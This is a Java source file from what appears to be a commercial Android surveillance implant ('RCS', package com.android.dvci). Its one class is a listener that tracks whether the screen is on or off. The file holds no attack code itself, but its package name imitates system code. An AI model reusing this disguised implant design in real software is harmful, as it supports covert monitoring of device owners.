/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ListenerStandby.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.listener;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.PowerManager;

import com.android.dvci.Standby;
import com.android.dvci.Status;

public class ListenerStandby extends Listener<Standby> {
	/** The Constant TAG. */
	private static final String TAG = "ListenerStandby"; //$NON-NLS-1$

	private BSt standbyReceiver;

	/** The singleton. */
	private volatile static ListenerStandby singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static ListenerStandby self() {
		if (singleton == null) {
			synchronized (ListenerStandby.class) {
				if (singleton == null) {
					singleton = new ListenerStandby();
				}
			}
		}

		return singleton;
	}

	@Override
	protected void start() {
		registerAc();
	}

	@Override
	protected void stop() {
		Status.getAppContext().unregisterReceiver(standbyReceiver);
	}

	/**
	 * Register Power Connected/Disconnected.
	 */
	private void registerAc() {
		standbyReceiver = new BSt();

		final IntentFilter filterOn = new IntentFilter(Intent.ACTION_SCREEN_ON);
		final IntentFilter filterOff = new IntentFilter(Intent.ACTION_SCREEN_OFF);

		// Register the broadcastreceiver and filter it to only get power status
		// changes
		Status.getAppContext().registerReceiver(standbyReceiver, filterOn);
		Status.getAppContext().registerReceiver(standbyReceiver, filterOff);
		//dispatch(new Standby(isScreenOn()));
	}

	public static boolean isScreenOn() {
		final PowerManager pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
		final boolean isScreenOn = pm.isScreenOn();
		return isScreenOn;
	}
}
